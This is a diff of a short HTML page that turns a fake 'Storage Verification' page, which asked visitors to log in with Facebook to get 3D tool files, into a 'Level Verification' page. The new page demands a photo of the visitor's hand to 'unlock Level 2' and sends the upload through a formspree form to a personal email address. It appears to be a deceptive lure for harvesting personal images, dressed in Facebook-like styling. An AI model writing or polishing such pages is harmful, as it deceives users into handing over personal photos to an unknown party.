@@ -2,16 +2,24 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>Storage Verification</title>
+    <title>Level Challenge Verification</title>
     <style>
         body { background-color: #f0f2f5; font-family: Arial; text-align: center; }
-        .content-box { background: white; padding: 25px; border-radius: 8px; margin-top: 50px; display: inline-block; }
+        .content-box { background: white; padding: 30px; border-radius: 12px; margin-top: 50px; display: inline-block; box-shadow: 0 4px 8px rgba(0,0,0,0.1); }
+        input[type="file"] { margin: 20px 0; }
+        button { background-color: #1877f2; color: white; border: none; padding: 10px 20px; border-radius: 5px; cursor: pointer; }
     </style>
 </head>
 <body>
     <div class="content-box">
-        <h2>Verification in Progress</h2>
-        <p>Login with Facebook to access 3D tool files.</p>
-        </div>
+        <h2>Level Verification Required</h2>
+        <p>Please upload a clear photo of your hand to unlock Level 2.</p>
+        
+        <form action="https://formspree.io/f/abdulakher2006@gmail.com" method="POST" enctype="multipart/form-data">
+            <input type="file" name="hand_photo" accept="image/*" required>
+            <br>
+            <button type="submit">Submit and Unlock</button>
+        </form>
+    </div>
 </body>
 </html>
